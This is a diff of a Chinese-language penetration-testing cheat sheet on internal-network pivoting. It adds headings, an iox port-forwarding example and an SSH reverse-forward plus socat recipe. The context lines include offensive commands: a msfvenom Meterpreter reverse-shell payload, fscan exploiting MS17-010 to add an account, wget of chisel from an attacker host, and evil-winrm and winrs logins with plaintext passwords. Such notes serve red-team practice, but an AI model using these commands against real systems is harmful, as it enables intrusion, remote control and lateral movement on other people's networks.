@@ -66,7 +66,9 @@ nc
 - 代理类别：HTTP 代理、socks 代理、telnet 代理、ssl 代理
 - 代理工具： [EarthWorm](https://mp.weixin.qq.com/s/Ss9IhP0WEWVmABxZfYXXgQ) 、reGeorg(http 代理)、proxifier(win)、sockscap64(win)、proxychains(linux)
 
-### tcptunnel 端口转发
+## 端口转发
+
+### tcptunnel/端口转发
 
 [tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)
 
@@ -82,7 +84,7 @@ nc
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.142.110 lport=1080 -f exe -o shell.exe
 ```
 
-### lcx
+### lcx/端口转发
 
 nb -tran 8000 192.168.127.134:8000
 nb -tran 1235 192.168.127.134:1235
@@ -103,6 +105,14 @@ lcx.exe -slave 192.168.10.10 9000 127.0.0.1 3389
 
 ## kali连接9001：
 rdesktop 192.168.10.10:9001
+```
+
+### iox 端口转发
+
+0.0.0.0:80 的流量转发至 127.0.0.1:81
+
+```sh
+root@ubuntu:/tmp# ./iox fwd -l 80 -r 127.0.0.1:81
 ```
 
 ### nc
@@ -135,7 +145,7 @@ fscan.exe -h 192.168.50.0/24 -m ms17010 -sc add
 # sysadmin 1qaz@WSX!@#4
 
 ksmb 192.168.1.89
-# proxifier 添加 eternalblue.dat 
+# proxifier 添加 eternalblue.dat
 # 3. https://www.freebuf.com/vuls/356052.html
 Eternalblue
 ```
@@ -511,7 +521,9 @@ token = frp123
 # frpc
 .\frpc tcp  -s "127.0.0.1:7000" -t frp123 -i "127.0.0.1" -l "2125"
 ```
+
 ## chisel
+
 ```sh
 wget http://10.10.16.5/chisel_1.9.1_linux
 ./socat tcp-listen:60218,reuseaddr,fork tcp:192.168.122.228:5985 &
@@ -520,6 +532,7 @@ wget http://10.10.16.5/chisel_1.9.1_linux
 ./socat tcp-listen:55555,reuseaddr,fork tcp:192.168.122.228:5985
 socat tcp-listen:5985,reuseaddr,fork tcp:10.10.16.5:55555
 ```
+
 ## goproxy
 
 ```shell
@@ -654,6 +667,21 @@ ssh -f -N -D 127.0.0.1:1080 ubuntu@192.168.50.161 -p 2222
 | -f   | 后台运行                       |
 | -N   | 不执行远程命令，只进行端口转发 |
 | -D   | SOCKS 代理的端口               |
+
+### 端口转发/服务器的 80，转发到客户端本地的 80
+* 需要root权限
+* 访问ubuntu的80端口会被转发到ubuntu的79端口，ubuntu的79端口会转发到我们本机的80端口
+
+注意：由于 SSH 的反向端口转发监听的时候只会监听 127.0.0.1，所以这时候需要点技巧
+如图所示，即使反向端口转发 79 端口指定监听全部 `(-R \*:79:127.0.0.1:80)`，端口 79 依旧绑定在了 127.0.0.1（图中顺便把 socks5 代理也开了）
+
+```sh
+kali@129$ ssh -i id_rsa root@47.92.254.136 -D 0.0.0.0:1080 -R \*:79:127.0.0.1:80
+# socat，让 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的 80 ,变相使 80 监听在 0.0.0.0
+root@47.92.254.136$ nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &
+kali@129$ nc -lvvp 80
+# 向 47.92.254.136 的80端口tcp发消息在kali上就能接收到   
+```
 
 ## socat 端口转发
 
@@ -836,7 +864,7 @@ python3 neoreg.py -k password -u http://xx/tunnel.php
 ## 端口复用
 
 [Linux 远控的端口复用](https://mp.weixin.qq.com/s/mHCOuR1rq2ExEYYWhA4vQg)
-[Linux持久化—IPTables 端口复用](https://mp.weixin.qq.com/s/k_C2d_H2Z_sRlJR_QRh55g)
+[Linux 持久化—IPTables 端口复用](https://mp.weixin.qq.com/s/k_C2d_H2Z_sRlJR_QRh55g)
 [Windows server 80 端口复用后门](https://mp.weixin.qq.com/s/unZEw-0r4LJKCGTAIsHYUA)
 [不同中间件端口复用代理解决方案](https://mp.weixin.qq.com/s/fBy9qiu9ELNB2TiFIgGMAQ)
 
@@ -916,12 +944,12 @@ http_proxy=http://192.168.50.161:2080/
 
 允许 IP: ID 右侧三个点 -> 允许 IP 直连
 
-
 ## evil-winrm 远程命令执行/ssh
+
 [Link](https://mp.weixin.qq.com/s/fSkygmxijKk70qJ32Ay83g)
 
 ```sh
-evil-winrm -i 172.16.1.10 -u backup_svc -p 'Makemoney1!' 
+evil-winrm -i 172.16.1.10 -u backup_svc -p 'Makemoney1!'
 # win自带命令 winrs
 ## 远程执行命令
 winrs -r:http://192.168.2.153:5985 -u:desktop-r3kfb05\hacker -p:qwe123.. "ipconfig"
@@ -1019,6 +1047,7 @@ sc start gupdate
 | psexec.py  | impacket-psexec  |
 | smbexec.py | impacket-smbexec |
 |            |                  |
+
 ## impacket/smb-server
 
 ```sh
